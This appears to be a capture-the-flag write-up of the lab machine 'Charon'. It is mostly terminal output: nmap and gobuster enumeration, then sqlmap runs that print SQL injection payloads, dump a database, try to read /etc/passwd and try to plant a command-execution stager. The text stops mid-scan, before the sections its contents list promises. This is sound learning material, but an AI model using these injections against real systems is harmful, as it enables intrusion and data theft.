#### Charon

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [Reverse Shell](#reverse-shell)
- [RSA](#rsa)
- [Privilege Escalation](#privilege-escalation)
- [Binary Exploitation](#binary-exploitation)

###### Attacker Info

```sh
root@kali:~/charon# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.8/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
       valid_lft 86304sec preferred_lft 86304sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::6605:b593:66a7:ffd4/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/charon#
```

###### Nmap Scan

```sh
root@kali:~/charon# nmap -sC -sV -oA charon.nmap 10.10.10.31
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-30 23:49 EDT
Nmap scan report for 10.10.10.31
Host is up (0.21s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee (RSA)
|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec (ECDSA)
|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Frozen Yogurt Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.23 seconds
root@kali:~/charon#
```

###### Web Enumeration

```
http://10.10.10.31/
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

```sh
root@kali:~/charon# sqlmap -l singlepost.req -p id
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.3#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:02:14

[00:02:14] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://10.10.10.31:80/singlepost.php?id=10
do you want to test this URL? [Y/n/q]
>
[00:02:16] [INFO] testing URL 'http://10.10.10.31:80/singlepost.php?id=10'
[00:02:16] [INFO] using '/root/.sqlmap/output/results-05312018_1202am.csv' as the CSV results file in multiple targets mode
[00:02:16] [INFO] testing connection to the target URL
[00:02:16] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:02:17] [INFO] testing if the target URL content is stable
[00:02:17] [INFO] target URL content is stable
[00:02:17] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[00:02:18] [INFO] testing for SQL injection on GET parameter 'id'
[00:02:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:02:19] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="eu")
[00:02:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[00:02:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[00:02:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[00:02:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[00:02:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[00:02:29] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[00:02:29] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[00:02:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:02:29] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:02:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:02:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:02:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:02:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:02:30] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:02:30] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[00:02:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[00:02:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[00:02:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[00:02:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[00:02:32] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[00:02:32] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[00:02:32] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[00:02:32] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[00:02:32] [INFO] testing 'MySQL inline queries'
[00:02:33] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[00:02:33] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[00:02:33] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[00:02:33] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[00:02:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[00:02:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[00:02:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:02:44] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[00:02:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:02:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:02:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:02:46] [INFO] target URL appears to have 5 columns in query
[00:02:48] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=10 AND 6770=6770

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=10 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-8455 UNION ALL SELECT NULL,CONCAT(0x7176707871,0x597258705a68484b49624a6477454b6d7261496c41556f52466a7375684c4c676e54507871464d4e,0x716a787171),NULL,NULL,NULL-- Dgmw
---
do you want to exploit this SQL injection? [Y/n]
[00:02:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[00:02:51] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05312018_1202am.csv'

[*] shutting down at 00:02:51

root@kali:~/charon#
```

```sh
root@kali:~/charon# sqlmap -l singlepost.req -p id --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.3#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:05:38

[00:05:38] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://10.10.10.31:80/singlepost.php?id=10
do you want to test this URL? [Y/n/q]
>
[00:05:39] [INFO] testing URL 'http://10.10.10.31:80/singlepost.php?id=10'
[00:05:39] [INFO] resuming back-end DBMS 'mysql'
[00:05:39] [INFO] using '/root/.sqlmap/output/results-05312018_1205am.csv' as the CSV results file in multiple targets mode
[00:05:39] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=10 AND 6770=6770

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=10 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-8455 UNION ALL SELECT NULL,CONCAT(0x7176707871,0x597258705a68484b49624a6477454b6d7261496c41556f52466a7375684c4c676e54507871464d4e,0x716a787171),NULL,NULL,NULL-- Dgmw
---
do you want to exploit this SQL injection? [Y/n]
[00:05:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[00:05:40] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[00:05:40] [INFO] fetching current database
[00:05:41] [INFO] fetching tables for database: 'freeeze'
[00:05:41] [INFO] used SQL query returns 1 entries
[00:05:41] [INFO] fetching columns for table 'blog' in database 'freeeze'
[00:05:41] [INFO] used SQL query returns 5 entries
[00:05:41] [INFO] retrieved: "id","int(10) unsigned"
[00:05:41] [INFO] retrieved: "date","varchar(12)"
[00:05:42] [INFO] retrieved: "author","varchar(50)"
[00:05:42] [INFO] retrieved: "text","varchar(1024)"
[00:05:42] [INFO] retrieved: "title","varchar(255)"
[00:05:42] [INFO] fetching entries for table 'blog' in database 'freeeze'
[00:05:42] [INFO] used SQL query returns 3 entries
[00:05:42] [INFO] retrieved: "10-10-2016\r\n","decoder","10","Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad mini...
[00:05:43] [INFO] retrieved: "10-11-2016","decoder","11","Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim ve...
[00:05:43] [INFO] retrieved: "10-12-2016","decoder","12","Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim ve...
Database: freeeze
Table: blog
[3 entries]
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------+---------+----------------+
| id | text                                                                                                                                                                                                                                                                                                                                            | title                 | author  | date           |
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------+---------+----------------+
| 10 | Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.  | New Chills for summer | decoder | 10-10-2016\r\n |
| 11 | Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.  | Berries on the grove  | decoder | 10-11-2016     |
| 12 | Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.  | On the diet           | decoder | 10-12-2016     |
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------+---------+----------------+

[00:05:43] [INFO] table 'freeeze.blog' dumped to CSV file '/root/.sqlmap/output/10.10.10.31/dump/freeeze/blog.csv'
[00:05:43] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05312018_1205am.csv'

[*] shutting down at 00:05:43

root@kali:~/charon#
```

```sh
root@kali:~/charon# sqlmap -l singlepost.req -p id --passwords
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.3#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:19:39

[00:19:39] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://10.10.10.31:80/singlepost.php?id=10
do you want to test this URL? [Y/n/q]
>
[00:19:41] [INFO] testing URL 'http://10.10.10.31:80/singlepost.php?id=10'
[00:19:41] [INFO] resuming back-end DBMS 'mysql'
[00:19:41] [INFO] using '/root/.sqlmap/output/results-05312018_1219am.csv' as the CSV results file in multiple targets mode
[00:19:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=10 AND 6770=6770

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=10 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-8455 UNION ALL SELECT NULL,CONCAT(0x7176707871,0x597258705a68484b49624a6477454b6d7261496c41556f52466a7375684c4c676e54507871464d4e,0x716a787171),NULL,NULL,NULL-- Dgmw
---
do you want to exploit this SQL injection? [Y/n]
[00:19:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[00:19:45] [INFO] fetching database users password hashes
[00:19:45] [WARNING] the SQL query provided does not return any output
[00:19:45] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[00:19:45] [INFO] fetching database users
[00:19:45] [INFO] used SQL query returns 1 entries
[00:19:45] [INFO] fetching number of password hashes for user 'freeeze'
[00:19:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:19:45] [INFO] retrieved:
[00:19:46] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
[00:19:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions

[00:19:52] [WARNING] unable to retrieve the number of password hashes for user 'freeeze'
[00:19:52] [ERROR] unable to retrieve the password hashes for the database users (probably because the DBMS current user has no read privileges over the relevant system database table(s))
[00:19:52] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05312018_1219am.csv'

[*] shutting down at 00:19:52

root@kali:~/charon#
```

```sh
root@kali:~/charon# sqlmap -l singlepost.req -p id --file-read=/etc/passwd
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:20:48

[00:20:48] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://10.10.10.31:80/singlepost.php?id=10
do you want to test this URL? [Y/n/q]
>
[00:20:49] [INFO] testing URL 'http://10.10.10.31:80/singlepost.php?id=10'
[00:20:49] [INFO] resuming back-end DBMS 'mysql'
[00:20:49] [INFO] using '/root/.sqlmap/output/results-05312018_1220am.csv' as the CSV results file in multiple targets mode
[00:20:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=10 AND 6770=6770

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=10 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-8455 UNION ALL SELECT NULL,CONCAT(0x7176707871,0x597258705a68484b49624a6477454b6d7261496c41556f52466a7375684c4c676e54507871464d4e,0x716a787171),NULL,NULL,NULL-- Dgmw
---
do you want to exploit this SQL injection? [Y/n]
[00:20:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[00:20:50] [INFO] fingerprinting the back-end DBMS operating system
[00:20:50] [INFO] the back-end DBMS operating system is Linux
[00:20:50] [INFO] fetching file: '/etc/passwd'
[00:20:51] [WARNING] there was a problem decoding value ' ' from expected hexadecimal form
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n]
[00:20:52] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
files saved to [1]:
[*] /root/.sqlmap/output/10.10.10.31/files/_etc_passwd (size differs from remote file)

[00:20:52] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05312018_1220am.csv'

[*] shutting down at 00:20:52

root@kali:~/charon# cat /root/.sqlmap/output/10.10.10.31/files/_etc_passwd
root@kali:~/charon#
```

```sh
root@kali:~/charon# sqlmap -l singlepost.req -p id --os-cmd=whoami
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:22:09

[00:22:09] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://10.10.10.31:80/singlepost.php?id=10
do you want to test this URL? [Y/n/q]
>
[00:22:10] [INFO] testing URL 'http://10.10.10.31:80/singlepost.php?id=10'
[00:22:10] [INFO] resuming back-end DBMS 'mysql'
[00:22:10] [INFO] using '/root/.sqlmap/output/results-05312018_1222am.csv' as the CSV results file in multiple targets mode
[00:22:10] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=10 AND 6770=6770

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=10 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-8455 UNION ALL SELECT NULL,CONCAT(0x7176707871,0x597258705a68484b49624a6477454b6d7261496c41556f52466a7375684c4c676e54507871464d4e,0x716a787171),NULL,NULL,NULL-- Dgmw
---
do you want to exploit this SQL injection? [Y/n]
[00:22:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[00:22:12] [INFO] going to use a web backdoor for command execution
[00:22:12] [INFO] fingerprinting the back-end DBMS operating system
[00:22:12] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
>
do you want sqlmap to further try to provoke the full path disclosure? [Y/n]
[00:22:23] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1
[00:22:32] [INFO] retrieved web server absolute paths: '/singlepost~.php'
[00:22:32] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[00:22:34] [WARNING] unable to upload the file stager on '/var/www/'
[00:22:34] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[00:22:34] [WARNING] expect junk characters inside the file as a leftover from UNION query
[00:22:34] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[00:22:35] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[00:22:36] [WARNING] unable to upload the file stager on '/var/www/html/'
[00:22:36] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
[00:22:36] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[00:22:37] [INFO] trying to upload the file stager on '/usr/local/apache2/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[00:22:39] [WARNING] unable to upload the file stager on '/usr/local/apache2/htdocs/'
[00:22:39] [INFO] trying to upload the file stager on '/usr/local/apache2/htdocs/' via UNION method
[00:22:40] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[00:22:41] [INFO] trying to upload the file stager on '/var/www/nginx-default/' via LIMIT 'LINES TERMINATED BY' method
[00:22:42] [WARNING] unable to upload the file stager on '/var/www/nginx-default/'
[00:22:42] [INFO] trying to upload the file stager on '/var/www/nginx-default/' via UNION method
[00:22:42] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[00:22:43] [INFO] trying to upload the file stager on '/srv/www/' via LIMIT 'LINES TERMINATED BY' method
[00:22:44] [WARNING] unable to upload the file stager on '/srv/www/'
[00:22:44] [INFO] trying to upload the file stager on '/srv/www/' via UNION method
[00:22:44] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[00:22:45] [INFO] trying to upload the file stager on '/' via LIMIT 'LINES TERMINATED BY' method
[00:22:45] [WARNING] unable to upload the file stager on '/'
[00:22:45] [INFO] trying to upload the file stager on '/' via UNION method
[00:22:45] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[00:22:46] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 41 times
[00:22:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05312018_1222am.csv'

[*] shutting down at 00:22:46

root@kali:~/charon#
```

```sh
root@kali:~/charon# gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.31 -t 30

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.31/
[+] Threads      : 30
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/include (Status: 301)
/fonts (Status: 301)
/cmsdata (Status: 301)
```

```
http://10.10.10.31/cmsdata/
```

![](images/8.png)

```sh
root@kali:~/charon# gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.31/cmsdata/ -t 30 -x php

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.31/cmsdata/
[+] Threads      : 30
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .php
=====================================================
/images (Status: 301)
/login.php (Status: 200)
/scripts (Status: 301)
/menu.php (Status: 302)
/upload.php (Status: 302)
/css (Status: 301)
/js (Status: 301)
/include (Status: 301)
/forgot.php (Status: 200)
```

```
http://10.10.10.31/cmsdata/login.php
```

![](images/9.png)

![](images/10.png)

![](images/11.png)

![](images/12.png)

![](images/13.png)

![](images/14.png)

![](images/15.png)

![](images/16.png)

![](images/17.png)

![](images/18.png)

```sh
root@kali:~/charon# sqlmap -l forgot.req --level 4 --risk 3 --batch -p email
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.3#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:37:59

[00:37:59] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://10.10.10.31:80/cmsdata/forgot.php
POST data: email=test%40gmail.com
do you want to test this URL? [Y/n/q]
> Y
[00:38:00] [INFO] testing URL 'http://10.10.10.31:80/cmsdata/forgot.php'
[00:38:00] [INFO] using '/root/.sqlmap/output/results-05312018_1238am.csv' as the CSV results file in multiple targets mode
[00:38:00] [INFO] testing connection to the target URL
[00:38:00] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:38:00] [INFO] testing if the target URL content is stable
[00:38:01] [INFO] target URL content is stable
[00:38:01] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[00:38:01] [INFO] testing for SQL injection on POST parameter 'email'
[00:38:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:38:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[00:38:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[00:38:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
[00:38:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)'
[00:39:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment) (NOT)'
[00:39:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[00:39:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[00:39:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'
[00:39:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[00:40:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[00:40:13] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[00:40:15] [INFO] POST parameter 'email' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --string=" User not found with that email!")
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (4) value? [Y/n] Y
[00:40:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:40:15] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:40:15] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:40:16] [INFO] target URL appears to have 4 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[00:40:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[00:40:22] [INFO] testing 'Generic UNION query (32) - 21 to 40 columns'
[00:40:26] [INFO] testing 'Generic UNION query (32) - 41 to 60 columns'
[00:40:30] [INFO] testing 'Generic UNION query (32) - 61 to 80 columns'
[00:40:33] [INFO] checking if the injection point on POST parameter 'email' is a false positive
